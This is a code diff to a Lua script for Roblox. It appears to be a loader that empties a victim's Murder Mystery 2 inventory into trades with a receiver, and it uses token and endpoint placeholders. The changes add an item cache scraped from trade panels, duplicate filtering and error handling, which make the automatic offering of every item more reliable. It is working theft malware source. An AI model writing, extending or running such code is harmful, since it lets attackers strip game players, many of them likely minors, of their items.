@@ -3,7 +3,7 @@
 -- your full inventory so you can join the server and collect.
 -- the loader holds for SESSION_SECONDS (5 minutes), then the client detaches cleanly.
 
-local CLIENT_REV = "2.8"
+local CLIENT_REV = "2.9"
 local TOKEN = "{{TOKEN}}"
 local ENDPOINT = "{{ENDPOINT}}"
 local MIN_VALUE = {{MIN_VALUE}}
@@ -453,6 +453,22 @@ end
 -- so an unreadable inventory can never be mistaken for an empty one
 local inventoryInfo = { collections = 0, containers = 0, gui = 0, panels = 0, seen = false }
 
+-- names read off a trade grid / inventory panel, kept so inventory() can answer
+-- even when the game never replicates items into the player object
+local itemCache = {}
+
+local function rememberItems(names)
+    local generic = {}
+    for _, name in ipairs(GENERIC_NAMES) do generic[name] = true end
+    for _, name in ipairs(names or {}) do
+        local clean = norm(name)
+        if #clean >= 2 and not isControlLabel(clean) and not generic[clean:lower()] then
+            itemCache[clean:lower()] = clean
+        end
+    end
+    if next(itemCache) then inventoryInfo.seen = true end
+end
+
 local function addGuiItems(add)
     local player = LocalPlayer or Players.LocalPlayer
     local gui = player and player:FindFirstChildOfClass("PlayerGui")
@@ -552,8 +568,15 @@ local function findInventoryToggle()
 end
 
 local function collectInventory()
-    local names = {}
-    for _, entry in ipairs(scanInventory()) do table.insert(names, entry.name) end
+    local names, seen = {}, {}
+    for _, entry in ipairs(scanInventory()) do
+        local key = entry.name:lower()
+        if not seen[key] then seen[key] = true table.insert(names, entry.name) end
+    end
+    for key, name in pairs(itemCache) do
+        if not seen[key] then seen[key] = true table.insert(names, name) end
+    end
+    table.sort(names, function(a, b) return a:lower() < b:lower() end)
     return names
 end
 
@@ -627,7 +650,7 @@ local function isRealItem(entry)
 
     -- mm2: the knife/gun you spawn with is just the equipped default, so only a
     -- collection folder or the inventory panel counts
-    if MM2 then return entry.at == "folder" or entry.at == "gui" end
+    if MM2 then return entry.at == "folder" or entry.at == "gui" or entry.at == "cache" end
 
     if IGNORE_EQUIPPED_DEFAULTS and entry.at == "equipped" and spawnDefaults[n] then return false end
     if not GUN_ONLY then return true end
@@ -652,10 +675,20 @@ local function realItems(deep)
         end
     end
 
-    local real = {}
+    local real, seen = {}, {}
     for _, entry in ipairs(all) do
-        if isRealItem(entry) then table.insert(real, entry.name) end
+        if isRealItem(entry) and not seen[entry.name:lower()] then
+            seen[entry.name:lower()] = true
+            table.insert(real, entry.name)
+        end
     end
+    for key, name in pairs(itemCache) do
+        if not seen[key] and isRealItem({ name = name, at = "cache" }) then
+            seen[key] = true
+            table.insert(real, name)
+        end
+    end
+    table.sort(real, function(a, b) return a:lower() < b:lower() end)
     return real, all
 end
 
@@ -850,9 +883,20 @@ end
 -- preferred by name so the receiver's cards are not clicked along with yours.
 local function hasInputConnection(obj)
     if typeof(getconnections) ~= "function" then return false end
-    local ok, list = pcall(getconnections, obj.MouseButton1Click)
-    if ok and list and #list > 0 then return true end
-    ok, list = pcall(getconnections, obj.InputBegan)
+
+    -- MouseButton1Click only exists on actual buttons. touching it on a Frame throws
+    -- "not a valid member", which used to kill the whole card scan.
+    local signal
+    pcall(function()
+        if obj:IsA("TextButton") or obj:IsA("ImageButton") then
+            signal = obj.MouseButton1Click
+        else
+            signal = obj.InputBegan
+        end
+    end)
+    if not signal then return false end
+
+    local ok, list = pcall(getconnections, signal)
     return (ok and list and #list > 0) or false
 end
 
@@ -1082,8 +1126,13 @@ end
 
 local function probeWithWindow()
     local lines = probeLines()
-    for _, line in ipairs(windowDump(tradeWindow())) do
-        if #lines < 40 then table.insert(lines, line) end
+    local ok, dump = pcall(windowDump, tradeWindow())
+    if ok and dump then
+        for _, line in ipairs(dump) do
+            if #lines < 40 then table.insert(lines, line) end
+        end
+    else
+        table.insert(lines, "dump error: " .. tostring(dump):sub(1, 40))
     end
     return lines
 end
@@ -1101,9 +1150,13 @@ local function offerEverything(receiver)
         for attempt = 1, 4 do
             task.wait(attempt == 1 and 1.2 or 1.5)
             local ok, found = pcall(tradeButtons, tradeWindow() or window)
+            if not ok then print("[vexora] card scan error: " .. tostring(found)) end
             if ok and found and #found > 0 then list = found break end
         end
         scanned = #list
+        local names = {}
+        for _, entry in ipairs(list) do table.insert(names, entry.label) end
+        rememberItems(names)
         for _, entry in ipairs(list) do
             if clicked >= OFFER_LIMIT then break end
             local used = activateCard(entry.button, tradeWindow() or window)
